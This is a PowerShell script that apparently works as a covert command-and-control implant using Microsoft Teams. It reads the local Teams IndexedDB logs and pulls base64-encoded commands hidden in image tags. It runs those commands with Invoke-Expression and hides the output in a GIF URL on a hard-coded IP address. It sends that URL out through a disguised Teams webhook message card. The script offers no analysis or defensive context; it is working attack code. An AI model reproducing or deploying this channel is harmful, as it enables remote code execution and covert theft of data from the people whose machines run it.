$importPath = "C:\Users\s93754\AppData\Roaming\Microsoft\Teams\IndexedDB\https_teams.microsoft.com_0.indexeddb.leveldb\*.log"


$originalendpoint = 'http://139.162.53.145:80/.gif'

while ($true) {

$firstString = "paving<img alt=`"Red Lold`" src=`"data:image/png;base64, "
$secondString = "`" />roads"

$text = Get-Content $importPath

#Sample pattern
$pattern = "(?<=$firstString).*?(?=$secondString)"

$output = [regex]::Matches($text,$pattern).value
$output = $output -replace '\s',''
$output -is [array]
$b = $output[$output.Length-2]
echo $b.GetType()
$b = $b.Trim()
$b = $b -replace '[^a-zA-Z0-9`++`/+`=+`.+]', ''
$DecodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b))
echo $DecodedText

$DecodedText2 = $DecodedText.Substring($DecodedText.IndexOf("`;hello;")+7)
echo $DecodedText2



If ($DecodedText2 -ne 'start') {


$cmdOutput = Invoke-Expression $DecodedText2 | Out-String


$cmdOutput = $cmdOutput.ToString()
echo $cmdOutput


$encodedBytes = [System.Text.Encoding]::UTF8.GetBytes($cmdOutput)
$encodedText = [System.Convert]::ToBase64String($encodedBytes)
echo $encodedText
$gifendpoint = "http://139.162.53.145:80/"+$encodedText+".gif"

$gifendpoint

If ($originalendpoint -ne $gifendpoint) {

echo "MADE IT"

$originalendpoint = $gifendpoint

echo $originalendpoint
echo $gifendpoint

$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Content-Type", "application/json")

$body = "{`n	`"@type`": `"MessageCard`",`n	`"@context`": `"https://schema.org/extensions`",`n	`"summary`": `"2 new Yammer posts`",`n	`"themeColor`": `"0078D7`",`n	`"sections`": [`n		{`n			`"activityImage`":`""+ $gifendpoint + "`",`n			`"activityTitle`": `"Chase Miller`",`n			`"activitySubtitle`": `"2 hours ago - 3 comments`",`n			`"facts`": [`n				{`n					`"name`": `"Keywords:`",`n					`"value`": `"Surface`"`n				},`n				{`n					`"name`": `"Group:`",`n					`"value`": `"Helpdesk Support`"`n				}`n			],`n			`"text`": `"Can You Solve the Math Problem That Is Baffling the Internet? More than 530,000 people were commenting on one single Facebook picture. Are you smart enough to figure it out?`",`n			`"potentialAction`": [`n				{`n					`"@type`": `"OpenUri`",`n					`"name`": `"View conversation`"`n				}`n			]`n		}`n		`n	]`n}"


echo $body
$response = Invoke-RestMethod 'https://scbcorp.webhook.office.com/webhookb2/0185d026-5bff-4426-8e2c-980b3609cce2@45202dee-4088-4e8c-8ebd-c01f56740e8f/IncomingWebhook/f051d7a5f5d1444cae43299b7b3f49d2/a105c61a-b2d8-4461-88cb-6d970a87f08c' -Method 'POST' -Headers $headers -Body $body
$response | ConvertTo-Json


}
}
}
